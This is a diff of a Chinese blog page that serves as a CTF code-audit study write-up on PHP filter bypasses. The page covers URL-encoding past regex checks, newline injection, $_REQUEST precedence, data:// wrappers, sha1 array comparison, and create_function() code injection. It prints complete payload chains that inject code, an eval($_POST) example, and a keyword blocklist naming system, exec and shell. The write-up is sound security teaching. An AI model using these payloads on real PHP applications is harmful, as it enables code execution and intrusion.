@@ -156,10 +156,15 @@
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <h1 id="代码审计知识点学习"><a href="#代码审计知识点学习" class="headerlink" title="代码审计知识点学习"></a>代码审计知识点学习</h1><h2 id="各种bypass"><a href="#各种bypass" class="headerlink" title="各种bypass"></a>各种bypass</h2><p>学习的Y1ng大佬的文章。原文链接</p>
+                <h1><span id="代码审计知识点学习">代码审计知识点学习</span></h1><h2><span id="各种bypass">各种bypass</span></h2><p>学习的Y1ng大佬的文章。原文链接</p>
 <p>[]: <a href="http://blog.sina.com.cn/s/blog_686999de0100jgda.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_686999de0100jgda.html</a></p>
-<p>[TOC]</p>
-<h4 id="create-function-代码注入介绍"><a href="#create-function-代码注入介绍" class="headerlink" title="create_function()代码注入介绍"></a>create_function()代码注入介绍</h4><p><code>create_function()</code>函数有两个参数<code>$args</code>和<code>$code</code>，用于创建一个lambda样式的函数</p>
+<!-- toc -->
+
+
+
+<!-- tocstop -->
+
+<h4><span id="create_function代码注入介绍">create_function()代码注入介绍</span></h4><p><code>create_function()</code>函数有两个参数<code>$args</code>和<code>$code</code>，用于创建一个lambda样式的函数</p>
 <p>例如，利用<code>create_function()</code>创建一个<code>myFunc()</code>函数，用于计算两个变量之和</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$myFunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a,$b'</span><span class="token punctuation">,</span><span class="token string">'return($a+$b)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -177,7 +182,7 @@
 <span class="token punctuation">}</span>
 <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Y1ng'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//}</span></code></pre>
 <p>通过手工闭合<code>}</code>使后面的代码<code>eval()</code>逃逸出了<code>myFunc()</code>得以执行，然后利用注释符<code>//</code>注释掉<code>}</code>保证了语法正确。</p>
-<h4 id="一道ctf"><a href="#一道ctf" class="headerlink" title="一道ctf"></a>一道ctf</h4><p>通过代码审计来学习一下各种bypass：</p>
+<h4><span id="一道ctf">一道ctf</span></h4><p>通过代码审计来学习一下各种bypass：</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
@@ -233,7 +238,7 @@ on<span class="token punctuation">,</span> are disabled in php<span class="token
     <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
     <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
-<h5 id="考点1：绕过QUERY-STRING的正则匹配"><a href="#考点1：绕过QUERY-STRING的正则匹配" class="headerlink" title="考点1：绕过QUERY_STRING的正则匹配"></a>考点1：绕过QUERY_STRING的正则匹配</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+<h5><span id="考点1绕过query_string的正则匹配">考点1：绕过QUERY_STRING的正则匹配</span></h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span>
         <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/y1ng|zuishuai|flag|YuZhou|Wudi|system|exec|passwd|ass|eval|sort|shell|ob|star t|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|lig ht|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
         <span class="token punctuation">)</span>  
@@ -242,42 +247,43 @@ on<span class="token punctuation">,</span> are disabled in php<span class="token
 <p>这个正则匹配了许多关键字，比如y1ng zuishuai flag passwd这些都是必须要用的，所以需要bypass。</p>
 <p>首先了解一下QUERY_STRING：</p>
 <blockquote>
-<pre><code>原文链接 http://blog.sina.com.cn/s/blog_686999de0100jgda.html
+<pre class=" language-php"><code class="language-php">原文链接 http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//blog.sina.com.cn/s/blog_686999de0100jgda.html</span>
 
-1，http://localhost/aaa/ (打开aaa中的index.php)
+<span class="token number">1</span>，http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/aaa/ (打开aaa中的index.php)</span>
 结果：
-$_SERVER[&#39;QUERY_STRING&#39;] = &quot;&quot;;
-$_SERVER[&#39;REQUEST_URI&#39;] = &quot;/aaa/&quot;;
-$_SERVER[&#39;SCRIPT_NAME&#39;] = &quot;/aaa/index.php&quot;;
-$_SERVER[&#39;PHP_SELF&#39;] = &quot;/aaa/index.php&quot;;
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php"</span><span class="token punctuation">;</span>
 
-2，http://localhost/aaa/?p=222 (附带查询)
+<span class="token number">2</span>，http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/aaa/?p=222 (附带查询)</span>
 结果：
-$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&quot;;
-$_SERVER[&#39;REQUEST_URI&#39;] = &quot;/aaa/?p=222&quot;;
-$_SERVER[&#39;SCRIPT_NAME&#39;] = &quot;/aaa/index.php&quot;;
-$_SERVER[&#39;PHP_SELF&#39;] = &quot;/aaa/index.php&quot;;
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"p=222"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/?p=222"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php"</span><span class="token punctuation">;</span>
 
-3，http://localhost/aaa/index.php?p=222&amp;q=333
+<span class="token number">3</span>，http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/aaa/index.php?p=222&amp;q=333</span>
 结果：
-$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;
-$_SERVER[&#39;REQUEST_URI&#39;] = &quot;/aaa/index.php?p=222&amp;q=333&quot;;
-$_SERVER[&#39;SCRIPT_NAME&#39;] = &quot;/aaa/index.php&quot;;
-$_SERVER[&#39;PHP_SELF&#39;] = &quot;/aaa/index.php&quot;;
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"p=222&amp;q=333"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php?p=222&amp;q=333"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/aaa/index.php"</span><span class="token punctuation">;</span>
 
 由实例可知：
-$_SERVER[&quot;QUERY_STRING&quot;] 获取查询 语句，实例中可知，获取的是?后面的值
-$_SERVER[&quot;REQUEST_URI&quot;] 获取 http://localhost 后面的值，包括/
-$_SERVER[&quot;SCRIPT_NAME&quot;] 获取当前脚本的路径，如：index.php
-$_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名</code></pre></blockquote>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"QUERY_STRING"</span><span class="token punctuation">]</span> 获取查询 语句，实例中可知，获取的是<span class="token operator">?</span>后面的值
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">]</span> 获取 http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost 后面的值，包括/</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"SCRIPT_NAME"</span><span class="token punctuation">]</span> 获取当前脚本的路径，如：index<span class="token punctuation">.</span>php
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"PHP_SELF"</span><span class="token punctuation">]</span> 当前正在执行脚本的文件名</code></pre>
+</blockquote>
 <p>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行URLDecode，而<code>$_GET[]</code>会，所以只要进行url编码即可绕过：</p>
-<h5 id="考点2：绕过y1ngzuishuai的正则匹配"><a href="#考点2：绕过y1ngzuishuai的正则匹配" class="headerlink" title="考点2：绕过y1ngzuishuai的正则匹配"></a>考点2：绕过y1ngzuishuai的正则匹配</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^y1ngzuishuai$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'y1ngzuishuai'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+<h5><span id="考点2绕过y1ngzuishuai的正则匹配">考点2：绕过y1ngzuishuai的正则匹配</span></h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^y1ngzuishuai$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'y1ngzuishuai'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
         <span class="token keyword">echo</span> <span class="token string">"Yes! You know that I zuishuai!&lt;br>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span> </code></pre>
 <p>看这段代码（先不管他外面那个禁止RFI的if条件），<code>/^y1ngzuishuai$/</code>中<code>^</code>匹配起始、<code>$</code>匹配结束，但又不能是y1ngzuishuai。</p>
 <p>对于这种正则匹配，可以使用<code>%0a</code>换行污染绕过，payload:</p>
-<pre><code>?zuishuai=y1ngzuishuai%0a</code></pre><h5 id="考点3：绕过-REQUEST的字母匹配"><a href="#考点3：绕过-REQUEST的字母匹配" class="headerlink" title="考点3：绕过$_REQUEST的字母匹配"></a>考点3：绕过$_REQUEST的字母匹配</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+<pre><code>?zuishuai=y1ngzuishuai%0a</code></pre><h5><span id="考点3绕过_request的字母匹配">考点3：绕过$_REQUEST的字母匹配</span></h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck your English letters'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
@@ -286,7 +292,7 @@ $_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名</code></pre>
 <p><code>foreach</code>循环遍历<code>$_REQUEST</code>数组，将键值赋给<code>$value</code>，然后检测<code>$value</code>是否包含字母，若是 则<code>die()</code>。</p>
 <p>根据题目可知，我们必须要<code>$_GET[]</code>一些东西，比如考点2中的<code>y1ngzuishuai%0a</code>。我们知道<code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值。</p>
 <p>因此对于需要GET的一些参数，比如<code>zuishuai</code>，只需要同时POST一个数字即可绕过：</p>
-<h5 id="考点4：绕过文件内容读取的比较"><a href="#考点4：绕过文件内容读取的比较" class="headerlink" title="考点4：绕过文件内容读取的比较"></a>考点4：绕过文件内容读取的比较</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
+<h5><span id="考点4绕过文件内容读取的比较">考点4：绕过文件内容读取的比较</span></h5><pre class=" language-php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^y1ngzuishuai$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'y1ngzuishuai'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
                 <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
@@ -308,14 +314,14 @@ data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p>但是本题目
 </ol>
 <p>所以最终payload为：</p>
 <pre><code>file=data://text/plain,%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69</code></pre><p>或者如果加上base64的话，因为<code>y1ng_YuZhou_Wudi_zuishuai</code>这个字符串进行base64编码后包含<code>ob</code>，而<code>ob</code>被正则给<code>ban</code>了，因此用base64也要url编码，payload：</p>
-<pre><code>file=data://text/plain;base64,%65%54%46%75%5a%31%39%5a%64%56%70%6f%62%33%56%66%56%33%56%6b%61%56%39%36%64%57%6c%7a%61%48%56%68%61%51==</code></pre><h5 id="考点5，绕过sha1比较"><a href="#考点5，绕过sha1比较" class="headerlink" title="考点5，绕过sha1比较"></a>考点5，绕过sha1比较</h5><p>题目要求<code>$y1ng</code>和<code>$passwd</code>不相等，但是他们的<code>sha1</code>要相等，如何绕过？</p>
+<pre><code>file=data://text/plain;base64,%65%54%46%75%5a%31%39%5a%64%56%70%6f%62%33%56%66%56%33%56%6b%61%56%39%36%64%57%6c%7a%61%48%56%68%61%51==</code></pre><h5><span id="考点5绕过sha1比较">考点5，绕过sha1比较</span></h5><p>题目要求<code>$y1ng</code>和<code>$passwd</code>不相等，但是他们的<code>sha1</code>要相等，如何绕过？</p>
 <p><code>sha1()</code>函数是无法处理数组的，如果<code>sha1()</code>的参数为一个数组会报Warning并返回False。</p>
 <p>所以只要<code>$y1ng</code>和<code>$password</code>都是数组，那么就会双双返回false，相等。</p>
 <p>数组绕过。</p>
 <p><strong>总结</strong>一下上面5个小考点的payload</p>
 <pre><code>?zuishuai=y1ngzuishuai%0a&amp;y1ng[]=1&amp;passwd[]=2&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><p>编码后为</p>
 <pre><code>?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%25%30%61&amp;%79%31%6e%67%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%69%6c%65=%64%61%74%61://%74%65%78%74/%70%6c%61%69%6e%2c%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69</code></pre><p>别忘了Post:</p>
-<pre><code>zuishuai=1&amp;file=1</code></pre><h5 id="考点6，create-function-代码注入"><a href="#考点6，create-function-代码注入" class="headerlink" title="考点6，create_function()代码注入"></a>考点6，create_function()代码注入</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<pre><code>zuishuai=1&amp;file=1</code></pre><h5><span id="考点6create_function代码注入">考点6，create_function()代码注入</span></h5><pre class=" language-php"><code class="language-php"><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
 <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$y1ng</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$y1ng</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -343,7 +349,7 @@ data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p>但是本题目
 POST: zuishuai=1&amp;file=1
 
 解码后：1nD3x.php?zuishuai=y1ngzuishuai&amp;y1ng[]=111&amp;passwd[]=222&amp;passwd[]=222&amp;flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><p>这里的flag.php是假flag，真的在1flag.php里</p>
-<h5 id="考点8，得到真正的flag-不适用于BJDCTF"><a href="#考点8，得到真正的flag-不适用于BJDCTF" class="headerlink" title="考点8，得到真正的flag (不适用于BJDCTF)"></a><strong>考点8，得到真正的flag (不适用于BJDCTF)</strong></h5><p>我们可以继续通过刚刚的方法，就是<code>get_defined_vars()</code>，得到1flag.php的变量的值，但是前提是需要包含1flag.php。</p>
+<h5><span id="考点8得到真正的flag-不适用于bjdctf"><strong>考点8，得到真正的flag (不适用于BJDCTF)</strong></span></h5><p>我们可以继续通过刚刚的方法，就是<code>get_defined_vars()</code>，得到1flag.php的变量的值，但是前提是需要包含1flag.php。</p>
 <p>现在的困难：</p>
 <ul>
 <li>过滤了include关键字</li>
